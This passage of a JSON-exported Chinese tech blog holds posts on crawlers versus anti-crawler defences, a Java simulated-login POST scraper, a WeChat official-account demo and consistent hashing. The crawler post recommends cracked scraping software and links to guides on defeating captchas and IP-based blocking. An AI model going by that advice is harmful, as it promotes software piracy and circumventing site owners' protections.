&#x5982;&#x679C;&#x662F;&#x7684;&#x8BDD;&#xFF0C;&#x600E;&#x4E48;&#x8981;&#x6C42;&#x8D54;&#x507F;&#xFF1F;&#x722C;&#x53D6;&#x7684;&#x5185;&#x5BB9;&#x5546;&#x4E1A;&#x4F7F;&#x7528;&#x76EE;&#x524D;&#x66F4;&#x503E;&#x5411;&#x5C5E;&#x4E8E;&#x8FDD;&#x6CD5;&#x884C;&#x4E3A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x56FD;&#x5185;&#x8FD8;&#x662F;&#x4E2A;&#x64E6;&#x8FB9;&#x7403;&#xFF0C;&#x96BE;&#x4EE5;&#x8D77;&#x8BC9;&#x6210;&#x529F;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x88AB;&#x6279;&#x91CF;&#x722C;&#x53D6;&#xFF0C;&#x6280;&#x672F;&#x624D;&#x662F;&#x6700;&#x540E;&#x4FDD;&#x969C;&#x3002; 2&#x3001;&#x5728;&#x722C;&#x866B;&#x4E0E;&#x53CD;&#x722C;&#x866B;&#x7684;&#x5BF9;&#x5F08;&#x4E2D;&#xFF0C;&#x8C01;&#x4F1A;&#x80DC;&#x5229;&#xFF1F;&#x722C;&#x866B;&#x4E0E;&#x53CD;&#x722C;&#x866B;&#x7684;&#x91CD;&#x70B9;&#x90FD;&#x5728;&#x4E8E;&#x6279;&#x91CF;&#xFF0C;&#x6CA1;&#x6709;&#x7EDD;&#x5BF9;&#x7684;&#x80DC;&#x5229;&#x65B9;&#x3002;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x7684;&#x662F;&#xFF0C;&#x53EA;&#x8981;&#x4EBA;&#x7C7B;&#x80FD;&#x591F;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#x7684;&#x7F51;&#x9875;&#xFF0C;&#x722C;&#x866B;&#x5728;&#x5177;&#x5907;&#x540C;&#x7B49;&#x8D44;&#x6E90;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4E00;&#x5B9A;&#x662F;&#x53EF;&#x4EE5;&#x6293;&#x53D6;&#x5230;&#xFF0C;&#x53EA;&#x662F;&#x80FD;&#x5426;&#x77ED;&#x65F6;&#x95F4;&#x5185;&#x5927;&#x6279;&#x91CF;&#x722C;&#x53D6;&#x7684;&#x95EE;&#x9898;&#x3002; 3&#x3001;&#x600E;&#x4E48;&#x5FEB;&#x901F;&#x722C;&#x53D6;&#x6570;&#x636E;&#xFF1F;&#x9996;&#x5148;&#x8003;&#x8651;&#x7684;&#x662F;&#x7528;&#x7F51;&#x4E0A;&#x5404;&#x79CD;&#x7834;&#x89E3;&#x7248;&#x722C;&#x866B;&#x8F6F;&#x4EF6;&#x722C;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x6BD4;&#x5982;&#x706B;&#x8F66;&#x5934;&#x91C7;&#x96C6;&#x5668;&#x3002;&#x5373;&#x80FD;&#x7528;&#x8F6F;&#x4EF6;&#x89E3;&#x51B3;&#x7684;&#x722C;&#x53D6;&#x6B65;&#x9AA4;&#xFF0C;&#x5C31;&#x6CA1;&#x5FC5;&#x8981;&#x5199;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x5458;&#x6BD4;&#x8F6F;&#x4EF6;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7B49;&#x8D44;&#x6E90;&#x91D1;&#x8D35;&#x3002;&#x5176;&#x6B21;&#x8003;&#x8651;&#x7684;&#x624D;&#x5E94;&#x8BE5;&#x662F;&#x5982;&#x4F55;&#x7528;&#x4EE3;&#x7801;&#x89E3;&#x51B3;&#x8F6F;&#x4EF6;&#x5B9E;&#x73B0;&#x4E0D;&#x4E86;&#x7684;&#x6B65;&#x9AA4;&#x3002; 4&#x3001;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x53CD;&#x722C;&#x866B;&#xFF1F; &#x516C;&#x53F8;&#x7684;&#x91CD;&#x8981;&#x8D44;&#x6E90;&#x88AB;&#x6279;&#x91CF;&#x722C;&#x53D6;&#xFF0C;&#x4E27;&#x5931;&#x7ADE;&#x4E89;&#x529B;&#x3002; &#x722C;&#x866B;&#x5360;&#x603B;PV&#x6BD4;&#x4F8B;&#x592A;&#x9AD8;&#xFF0C;&#x56E0;&#x4E3A;&#x9AD8;&#x8BBF;&#x95EE;&#x91CF;&#x6D6A;&#x8D39;&#x4E86;&#x592A;&#x591A;&#x94B1;&#x3002; &#x722C;&#x866B;&#x62D6;&#x57AE;&#x4E86;&#x7AD9;&#x70B9;&#xFF0C;&#x4E25;&#x91CD;&#x5F71;&#x54CD;&#x4E86;&#x7528;&#x6237;&#x4F53;&#x9A8C;&#x3002; &#x8D44;&#x6E90;&#x88AB;&#x722C;&#x53D6;&#x96BE;&#x4EE5;&#x8D77;&#x8BC9;&#x6210;&#x529F;&#xFF0C;&#x5BF9;&#x65B9;&#x53EF;&#x4EE5;&#x8086;&#x610F;&#x722C;&#x53D6;&#x3002; &#x94FE;&#x63A5;&#x76F8;&#x5173; &#x6709;&#x54EA;&#x4E9B;&#x7F51;&#x7AD9;&#x7528;&#x722C;&#x866B;&#x80FD;&#x722C;&#x5230;&#x5F88;&#x6709;&#x4EF7;&#x503C;&#x7684;&#x6570;&#x636E;&#xFF1F;https://www.zhihu.com/question/36132174 &#x5229;&#x7528;&#x722C;&#x866B;&#x6280;&#x672F;&#x80FD;&#x505A;&#x5230;&#x54EA;&#x4E9B;&#x5F88;&#x9177;&#x5F88;&#x6709;&#x8DA3;&#x5F88;&#x6709;&#x7528;&#x7684;&#x4E8B;&#x60C5;&#xFF1F;https://www.zhihu.com/question/27621722 python&#x722C;&#x866B;&#x6E90;&#x7801;&#x96C6;&#x9526;https://github.com/facert/awesome-spider &#x300A;&#x6211;&#x7528;&#x722C;&#x866B;&#x4E00;&#x5929;&#x65F6;&#x95F4;&#x201C;&#x5077;&#x4E86;&#x201D;&#x77E5;&#x4E4E;&#x4E00;&#x767E;&#x4E07;&#x7528;&#x6237;&#xFF0C;&#x53EA;&#x4E3A;&#x8BC1;&#x660E;PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;&#x300B;&#x6587;&#x7AE0;&#x94FE;&#x63A5;&#xFF1A;http://developer.51cto.com/art/201509/491336.htm&#x5F00;&#x53D1;&#x8005;&#x6587;&#x6863;&#xFF1A;https://doc.phpspider.org/Github&#x5730;&#x5740;&#xFF1A;https://github.com/owner888/phpspider heritrix3 Java&#x722C;&#x866B;&#x6846;&#x67B6;https://github.com/internetarchive/heritrix3 &#x9A8C;&#x8BC1;&#x7801;&#x5BF9;&#x6297;&#x4E4B;&#x8DEF;&#x53CA;&#x73B0;&#x6709;&#x9A8C;&#x8BC1;&#x673A;&#x5236;&#x4ECB;&#x7ECD;https://yq.aliyun.com/articles/57807?spm=5176.100240.searchblog.21.OuIr47 12306 &#x552E;&#x7968;&#x7F51;&#x7AD9;&#x65B0;&#x7248;&#x9A8C;&#x8BC1;&#x7801;&#x8BC6;&#x522B;&#x5BF9;&#x6297;https://segmentfault.com/a/1190000002606801 18&#x6B3E;Java&#x5F00;&#x6E90;Web&#x722C;&#x866B;&#x3010;Heritrix&#x7B49;&#x3011;https://www.oschina.net/news/77402/19-java-open-source-web-crawler &#x7A81;&#x7834;&#x53CD;&#x722C;&#x866B;&#x7684;&#x5229;&#x5668;&#x2014;&#x2014;&#x5F00;&#x6E90;IP&#x4EE3;&#x7406;&#x6C60;&#x3010;&#x9644;&#x6E90;&#x7801;&#x3011;https://zhuanlan.zhihu.com/p/23928595 fiddler&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x3001;app&#x6293;&#x5305;&#x53CA;&#x8BC1;&#x4E66;&#x5B89;&#x88C5;http://blog.csdn.net/u011608531/article/details/50838227 &#x706B;&#x8F66;&#x5934;&#x91C7;&#x96C6;&#x5668;&#x5E2E;&#x52A9;&#x6587;&#x6863;http://www.locoy.com/index/guide","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://www.wangxin123.com/tags/爬虫/"}]},{"title":"使用Post方法模拟登陆爬取网页","slug":"使用Post方法模拟登陆爬取网页","date":"2016-12-19T14:10:00.000Z","updated":"2017-01-07T10:17:56.730Z","comments":true,"path":"2016/12/19/使用Post方法模拟登陆爬取网页/","link":"","permalink":"http://www.wangxin123.com/2016/12/19/使用Post方法模拟登陆爬取网页/","excerpt":"&#x6700;&#x8FD1;&#x5F04;&#x722C;&#x866B;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;post&#x65B9;&#x6CD5;&#x6A21;&#x62DF;&#x767B;&#x9646;&#x722C;&#x53D6;&#x7F51;&#x9875;&#x3002;&#x4E0B;&#x9762;&#x662F;&#x6781;&#x7B80;&#x7248;&#x7684;&#x4EE3;&#x7801;&#xFF1A;","keywords":null,"text":"&#x6700;&#x8FD1;&#x5F04;&#x722C;&#x866B;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;post&#x65B9;&#x6CD5;&#x6A21;&#x62DF;&#x767B;&#x9646;&#x722C;&#x53D6;&#x7F51;&#x9875;&#x3002;&#x4E0B;&#x9762;&#x662F;&#x6781;&#x7B80;&#x7248;&#x7684;&#x4EE3;&#x7801;&#xFF1A; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import java.io.BufferedReader;import java.io.InputStreamReader;import java.io.OutputStreamWriter;import java.io.PrintWriter;import java.net.HttpURLConnection;import java.net.URL;import java.util.HashMap;public class test { //post&#x8BF7;&#x6C42;&#x5730;&#x5740; private static final String POST_URL = &quot;&quot;; //&#x6A21;&#x62DF;&#x8C37;&#x6B4C;&#x6D4F;&#x89C8;&#x5668;&#x8BF7;&#x6C42; private static final String USER_AGENT = &quot;&quot;; //&#x7528;&#x8D26;&#x53F7;&#x767B;&#x5F55;&#x67D0;&#x7F51;&#x7AD9;&#x540E; &#x8BF7;&#x6C42;POST_URL&#x94FE;&#x63A5;&#x83B7;&#x53D6;cookie private static final String COOKIE = &quot;&quot;; //&#x7528;&#x8D26;&#x53F7;&#x767B;&#x5F55;&#x67D0;&#x7F51;&#x7AD9;&#x540E; &#x8BF7;&#x6C42;POST_URL&#x94FE;&#x63A5;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5305; private static final String REQUEST_DATA = &quot;&quot;; public static void main(String[] args) throws Exception { HashMap&lt;String, String&gt; map = postCapture(REQUEST_DATA); String responseCode = map.get(&quot;responseCode&quot;); String value = map.get(&quot;value&quot;); while(!responseCode.equals(&quot;200&quot;)){ map = postCapture(REQUEST_DATA); responseCode = map.get(&quot;responseCode&quot;); value = map.get(&quot;value&quot;); } //&#x6253;&#x5370;&#x722C;&#x53D6;&#x7ED3;&#x679C; System.out.println(value); } private static HashMap&lt;String, String&gt; postCapture(String requestData) throws Exception{ HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;(); URL url = new URL(POST_URL); HttpURLConnection httpConn = (HttpURLConnection) url.openConnection(); httpConn.setDoInput(true); // &#x8BBE;&#x7F6E;&#x8F93;&#x5165;&#x6D41;&#x91C7;&#x7528;&#x5B57;&#x8282;&#x6D41; httpConn.setDoOutput(true); // &#x8BBE;&#x7F6E;&#x8F93;&#x51FA;&#x6D41;&#x91C7;&#x7528;&#x5B57;&#x8282;&#x6D41; httpConn.setUseCaches(false); //&#x8BBE;&#x7F6E;&#x7F13;&#x5B58; httpConn.setRequestMethod(&quot;POST&quot;);//POST&#x8BF7;&#x6C42; httpConn.setRequestProperty(&quot;User-Agent&quot;, USER_AGENT); httpConn.setRequestProperty(&quot;Cookie&quot;, COOKIE); PrintWriter out = new PrintWriter(new OutputStreamWriter(httpConn.getOutputStream(), &quot;UTF-8&quot;)); out.println(requestData); out.close(); int responseCode = httpConn.getResponseCode(); StringBuffer buffer = new StringBuffer(); if (responseCode == 200) { BufferedReader reader = new BufferedReader(new InputStreamReader(httpConn.getInputStream(), &quot;UTF-8&quot;)); String line = null; while ((line = reader.readLine()) != null) { buffer.append(line); } reader.close(); httpConn.disconnect(); } map.put(&quot;responseCode&quot;, new Integer(responseCode).toString()); map.put(&quot;value&quot;, buffer.toString()); return map; }}","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://www.wangxin123.com/tags/爬虫/"}]},{"title":"微信公众号开发","slug":"微信公众号开发","date":"2016-12-07T10:53:00.000Z","updated":"2017-02-21T08:35:54.895Z","comments":true,"path":"2016/12/07/微信公众号开发/","link":"","permalink":"http://www.wangxin123.com/2016/12/07/微信公众号开发/","excerpt":"&#x6700;&#x8FD1;&#x8FDB;&#x884C;&#x4E86;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x9884;&#x7814;&#xFF0C;&#x76EE;&#x524D;&#x652F;&#x6301;&#x7684;&#x529F;&#x80FD;&#x5982;&#x4E0B; &#x652F;&#x6301;&#x5173;&#x952E;&#x5B57;&#x56DE;&#x590D;&#xFF0C;&#x76EE;&#x524D;&#x80FD;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; &#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#x83DC;&#x5355;&#x521B;&#x5EFA;&#x53CA;&#x83DC;&#x5355;&#x4E8B;&#x4EF6;&#x54CD;&#x5E94;&#x3002; &#x652F;&#x6301;&#x5404;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x7684;&#x8BC6;&#x522B;&#x3002;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x7528;&#x6237;&#x53D1;&#x9001;&#x7684;&#x6587;&#x672C;&#x3001;&#x56FE;&#x7247;&#x3001;&#x58F0;&#x97F3;&#x3001;&#x5730;&#x5740;&#x548C;&#x94FE;&#x63A5;&#x4FE1;&#x606F;&#x7B49;&#x3002; &#x652F;&#x6301;&#x62CD;&#x7167;&#x7B54;&#x9898;&#x3002;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x5185;&#x5E26;&#x62CD;&#x7167;&#x529F;&#x80FD;&#xFF0C;&#x7528;&#x6237;&#x53D1;&#x9001;&#x56FE;&#x7247;&#x540E;&#xFF0C;&#x540E;&#x7AEF;&#x53EF;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x8FDB;&#x884C;&#x56FE;&#x7247;&#x8BC6;&#x522B;&#xFF0C;&#x5E76;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; &#x901A;&#x8FC7;&#x70B9;&#x51FB;&#x83DC;&#x5355;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x9875;&#x9762;&#x3002;&#x540E;&#x671F;&#x524D;&#x7AEF;&#x53EF;&#x4EE5;&#x4ECB;&#x5165;&#x8FDB;&#x884C;&#x76F8;&#x5173;HTML5&#x5F00;&#x53D1;&#x3002; &#x652F;&#x6301;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x7684;&#x83B7;&#x53D6;&#x3002;&#x540E;&#x671F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4E2A;&#x6027;&#x5316;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#x3002; &#x652F;&#x6301;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x67E5;&#x8BE2;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x521B;&#x5EFA;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x4FEE;&#x6539;&#x7B49;&#x3002; &#x652F;&#x6301;&#x4E34;&#x65F6;/&#x6C38;&#x4E45;&#x5E26;&#x53C2;&#x4E8C;&#x7EF4;&#x7801;&#x7684;&#x521B;&#x5EFA;&#x3002; &#x652F;&#x6301;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x7684;&#x4E0A;&#x4F20;&#x4E0E;&#x4E0B;&#x8F7D;&#x3002;","keywords":null,"text":"&#x6700;&#x8FD1;&#x8FDB;&#x884C;&#x4E86;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x9884;&#x7814;&#xFF0C;&#x76EE;&#x524D;&#x652F;&#x6301;&#x7684;&#x529F;&#x80FD;&#x5982;&#x4E0B; &#x652F;&#x6301;&#x5173;&#x952E;&#x5B57;&#x56DE;&#x590D;&#xFF0C;&#x76EE;&#x524D;&#x80FD;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; &#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#x83DC;&#x5355;&#x521B;&#x5EFA;&#x53CA;&#x83DC;&#x5355;&#x4E8B;&#x4EF6;&#x54CD;&#x5E94;&#x3002; &#x652F;&#x6301;&#x5404;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x7684;&#x8BC6;&#x522B;&#x3002;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x7528;&#x6237;&#x53D1;&#x9001;&#x7684;&#x6587;&#x672C;&#x3001;&#x56FE;&#x7247;&#x3001;&#x58F0;&#x97F3;&#x3001;&#x5730;&#x5740;&#x548C;&#x94FE;&#x63A5;&#x4FE1;&#x606F;&#x7B49;&#x3002; &#x652F;&#x6301;&#x62CD;&#x7167;&#x7B54;&#x9898;&#x3002;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x5185;&#x5E26;&#x62CD;&#x7167;&#x529F;&#x80FD;&#xFF0C;&#x7528;&#x6237;&#x53D1;&#x9001;&#x56FE;&#x7247;&#x540E;&#xFF0C;&#x540E;&#x7AEF;&#x53EF;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x8FDB;&#x884C;&#x56FE;&#x7247;&#x8BC6;&#x522B;&#xFF0C;&#x5E76;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; &#x901A;&#x8FC7;&#x70B9;&#x51FB;&#x83DC;&#x5355;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x9875;&#x9762;&#x3002;&#x540E;&#x671F;&#x524D;&#x7AEF;&#x53EF;&#x4EE5;&#x4ECB;&#x5165;&#x8FDB;&#x884C;&#x76F8;&#x5173;HTML5&#x5F00;&#x53D1;&#x3002; &#x652F;&#x6301;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x7684;&#x83B7;&#x53D6;&#x3002;&#x540E;&#x671F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4E2A;&#x6027;&#x5316;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#x3002; &#x652F;&#x6301;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x67E5;&#x8BE2;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x521B;&#x5EFA;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x4FEE;&#x6539;&#x7B49;&#x3002; &#x652F;&#x6301;&#x4E34;&#x65F6;/&#x6C38;&#x4E45;&#x5E26;&#x53C2;&#x4E8C;&#x7EF4;&#x7801;&#x7684;&#x521B;&#x5EFA;&#x3002; &#x652F;&#x6301;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x7684;&#x4E0A;&#x4F20;&#x4E0E;&#x4E0B;&#x8F7D;&#x3002; &#x9879;&#x76EE;&#x5B9E;&#x73B0;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x662F;servlet&#xFF0C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x67B6;&#x6784;&#x548C;&#x591A;&#x4F59;&#x4EE3;&#x7801;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x67E5;&#x770B;&#x6838;&#x5FC3;&#x4E1A;&#x52A1;&#x7C7B;CoreService&#x3002;Github&#x5730;&#x5740;&#xFF1A;https://github.com/Wasim37/weixin_demo.git (&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D;)","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[{"name":"微信公众号","slug":"微信公众号","permalink":"http://www.wangxin123.com/tags/微信公众号/"}]},{"title":"一致哈希","slug":"一致哈希","date":"2016-11-20T10:53:00.000Z","updated":"2017-01-09T12:22:05.983Z","comments":true,"path":"2016/11/20/一致哈希/","link":"","permalink":"http://www.wangxin123.com/2016/11/20/一致哈希/","excerpt":"&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;&#x5728;&#x505A;&#x670D;&#x52A1;&#x5668;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x65F6;&#x5019;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7B97;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5305;&#x62EC;&#xFF1A; &#x8F6E;&#x5FAA;&#x7B97;&#x6CD5;(Round Robin)&#x3001;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;(HASH)&#x3001;&#x6700;&#x5C11;&#x8FDE;&#x63A5;&#x7B97;&#x6CD5;(Least Connection)&#x3001;&#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x7B97;&#x6CD5;(Response Time)&#x3001;&#x52A0;&#x6743;&#x6CD5;(Weighted )&#x7B49;&#x3002;&#x5176;&#x4E2D;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;. &#x5178;&#x578B;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#x662F;&#xFF1A; &#x6709;N&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4F9B;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x5E73;&#x5747;&#x5206;&#x53D1;&#x5230;&#x6BCF;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x8D1F;&#x8D23;1/N&#x7684;&#x670D;&#x52A1;&#x3002; &#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;&#x662F;&#x5BF9;hash&#x7ED3;&#x679C;&#x53D6;&#x4F59;&#x6570; (hash() mod N )&#xFF1A;&#x5BF9;&#x673A;&#x5668;&#x7F16;&#x53F7;&#x4ECE;0&#x5230;N-1&#xFF0C;&#x6309;&#x7167;&#x81EA;&#x5B9A;&#x4E49;&#x7684; hash()&#x7B97;&#x6CD5;&#xFF0C;&#x5BF9;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;hash()&#x503C;&#x6309;N&#x53D6;&#x6A21;&#xFF0C;&#x5F97;&#x5230;&#x4F59;&#x6570;i&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BF7;&#x6C42;&#x5206;&#x53D1;&#x5230;&#x7F16;&#x53F7;&#x4E3A;i&#x7684;&#x673A;&#x5668;&#x3002;&#x4F46;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x65B9;&#x6CD5;&#x5B58;&#x5728;&#x81F4;&#x547D;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x843D;&#x5728;&#x8BE5;&#x673A;&#x5668;&#x7684;&#x8BF7;&#x6C42;&#x5C31;&#x65E0;&#x6CD5;&#x5F97;&#x5230;&#x6B63;&#x786E;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x65F6;&#x9700;&#x8981;&#x5C06;&#x5F53;&#x6389;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x7B97;&#x6CD5;&#x4ECE;&#x53BB;&#x9664;&#xFF0C;&#x6B64;&#x65F6;&#x5019;&#x4F1A;&#x6709;(N-1)/N&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;;&#x5982;&#x679C;&#x65B0;&#x589E;&#x4E00;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x4F1A;&#x6709;N /(N+1)&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x3002;&#x5BF9;&#x4E8E;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#xFF0C;&#x8FD9;&#x901A;&#x5E38;&#x662F;&#x4E0D;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x98A0;&#x7C38;(&#x56E0;&#x4E3A;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5927;&#x91CF;&#x7F13;&#x5B58;&#x7684;&#x5931;&#x6548;&#x6216;&#x8005;&#x6570;&#x636E;&#x9700;&#x8981;&#x8F6C;&#x79FB;)&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x4E00;&#x4E2A;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7B56;&#x7565;&#xFF0C;&#x4F7F;&#x5F97;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x7684;&#x8BF7;&#x6C42;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5C11;&#x5462;? &#x5728;Memcached&#x3001;Key-Value Store &#x3001;Bittorrent DHT&#x3001;LVS&#x4E2D;&#x90FD;&#x91C7;&#x7528;&#x4E86;Consistent Hashing&#x7B97;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Consistent Hashing &#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x9996;&#x9009;&#x7B97;&#x6CD5;&#x3002;","keywords":null,"text":"&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;&#x5728;&#x505A;&#x670D;&#x52A1;&#x5668;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x65F6;&#x5019;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7B97;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5305;&#x62EC;&#xFF1A; &#x8F6E;&#x5FAA;&#x7B97;&#x6CD5;(Round Robin)&#x3001;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;(HASH)&#x3001;&#x6700;&#x5C11;&#x8FDE;&#x63A5;&#x7B97;&#x6CD5;(Least Connection)&#x3001;&#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x7B97;&#x6CD5;(Response Time)&#x3001;&#x52A0;&#x6743;&#x6CD5;(Weighted )&#x7B49;&#x3002;&#x5176;&#x4E2D;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;. &#x5178;&#x578B;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#x662F;&#xFF1A; &#x6709;N&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4F9B;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x5E73;&#x5747;&#x5206;&#x53D1;&#x5230;&#x6BCF;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x8D1F;&#x8D23;1/N&#x7684;&#x670D;&#x52A1;&#x3002; &#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;&#x662F;&#x5BF9;hash&#x7ED3;&#x679C;&#x53D6;&#x4F59;&#x6570; (hash() mod N )&#xFF1A;&#x5BF9;&#x673A;&#x5668;&#x7F16;&#x53F7;&#x4ECE;0&#x5230;N-1&#xFF0C;&#x6309;&#x7167;&#x81EA;&#x5B9A;&#x4E49;&#x7684; 